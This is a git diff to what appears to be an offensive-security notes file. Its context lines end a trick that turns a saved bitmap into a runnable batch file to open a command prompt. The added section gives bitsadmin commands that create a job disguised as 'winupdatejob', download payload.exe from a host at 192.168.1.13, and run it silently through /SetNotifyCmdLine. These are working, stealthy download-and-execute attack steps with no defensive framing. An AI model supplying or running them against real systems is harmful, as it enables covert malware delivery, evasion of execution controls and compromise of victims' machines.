@@ -756,3 +756,23 @@ Pixel 6 = R(0), G(0), B(0)
 7. Now save the picture using the ```File | Save``` as option and choose 24-bit Bitmap as the type.  I saved it as command.bmp
 8. Make a copy of the file and rename it to command.bat.
 9. Double click the file to run the batch file and you will open a command prompt!
+
+## BITS Jobs and Downloads:
+
+Starting with creating a job named “winupdatejob”, then we add the payload file in the job that we just created.
+
+```
+bitsadmin /addfile winupdatejob http://192.168.1.13/payload.exe C:\payload.exe
+```
+
+After adding the file, we use the /SetNotifyCmdLine switch to execute the payload. This is done with the help of an action that we scripted. First, it will start the cmd.exe and then, it will complete the download and then it will execute the said command in the background.
+
+```
+bitsadmin /SetNotifyCmdLine winupdatejob cmd.exe "/c bitsadmin.exe /complete winupdatejob | start /B C:\payload.exe"
+```
+
+After this, we run the /resume switch to get the download started.
+
+```
+bitsadmin /resume winupdatejob
+```
